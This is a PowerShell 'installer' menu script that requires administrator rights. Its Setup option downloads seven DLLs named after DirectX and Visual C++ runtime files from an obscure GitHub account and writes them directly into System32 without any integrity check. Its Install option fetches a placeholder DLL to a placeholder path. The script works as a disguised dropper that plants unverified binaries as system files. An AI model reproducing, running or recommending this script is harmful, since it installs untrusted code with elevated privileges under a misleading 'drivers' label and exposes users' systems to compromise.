if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")) {
    Write-Host "[ - ] open with administrator!" -ForegroundColor Red
    pause
    exit
}

function Show-Menu 
{
    Clear-Host
    Write-Host "==============================" -ForegroundColor Yellow
    Write-Host "         INSTALER             " -ForegroundColor Yellow
    Write-Host "==============================" -ForegroundColor Yellow
    Write-Host ""
    Write-Host "  [ 1 ] Setup"
    Write-Host "  [ 2 ] Install"
    Write-Host "  [ 3 ] Exit"
    Write-Host ""
    Write-Host "==============================" -ForegroundColor Yellow
}

function Run-Setup 
{
    Write-Host "`n[Setup] Checking drivers in System32..." -ForegroundColor Green

    $system32 = "$env:SystemRoot\System32"

    $driverFiles = @(
        @{ name = "D3DCompiler_43.dll"; url = "https://github.com/fsjnaedbhnvgjihbenibensifb/drivers/raw/refs/heads/main/D3DCompiler_43.dll" },
        @{ name = "D3DX9_43.dll";       url = "https://github.com/fsjnaedbhnvgjihbenibensifb/drivers/raw/refs/heads/main/D3DX9_43.dll"       },
        @{ name = "d3dx10_43.dll";      url = "https://github.com/fsjnaedbhnvgjihbenibensifb/drivers/raw/refs/heads/main/d3dx10_43.dll"      },
        @{ name = "d3dx11_43.dll";      url = "https://github.com/fsjnaedbhnvgjihbenibensifb/drivers/raw/refs/heads/main/d3dx11_43.dll"      },
        @{ name = "msvcp140.dll";       url = "https://github.com/fsjnaedbhnvgjihbenibensifb/drivers/raw/refs/heads/main/msvcp140.dll"       },
        @{ name = "vcruntime140.dll";   url = "https://github.com/fsjnaedbhnvgjihbenibensifb/drivers/raw/refs/heads/main/vcruntime140.dll"   },
        @{ name = "vcruntime140_1.dll"; url = "https://github.com/fsjnaedbhnvgjihbenibensifb/drivers/raw/refs/heads/main/vcruntime140_1.dll" }
    )

    foreach ($file in $driverFiles) {
        $dest = Join-Path $system32 $file.name

        if (Test-Path $dest) {
            Write-Host "  [OK] $($file.name) skipping" -ForegroundColor DarkGray
        } else {
            Write-Host "  [->] $($file.name) dont find, downloading..." -NoNewline
            try {
                Invoke-WebRequest -Uri $file.url -OutFile $dest -UseBasicParsing
                Write-Host " COMPLETED" -ForegroundColor Green
            } catch {
                Write-Host " ERRO: $_" -ForegroundColor Red
            }
        }
    }

    Write-Host "`n[Setup] Finished!" -ForegroundColor Cyan
    pause
}

function Run-Install
 {
    Write-Host "`n[Install] Downloading..." -ForegroundColor Green
    $fileUrl  = "https://SEU_LINK/arquivo.dll"
    $destPath = "C:\Caminho\Destino\arquivo.dll" 

    Write-Host "  -> Downloading for : $destPath" -NoNewline
    try 
    {
        $dir = Split-Path $destPath
        if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }

        Invoke-WebRequest -Uri $fileUrl -OutFile $destPath -UseBasicParsing
        Write-Host " OK" -ForegroundColor Green
    } catch
     {
        Write-Host " ERRO: $_" -ForegroundColor Red
    }

    Write-Host "`n[Install] Completed!" -ForegroundColor Cyan
    pause
}

do 
{
    Show-Menu
    $choice = Read-Host "  Select one option"

    switch ($choice) 
    {
        "1" { Run-Setup }
        "2" { Run-Install }
        "3" { Write-Host "`nExiting ...`n" -ForegroundColor Yellow; exit }
        default { Write-Host "`nInvalid Option, try again" -ForegroundColor Red; Start-Sleep -Seconds 1 }
    }
} while ($true)
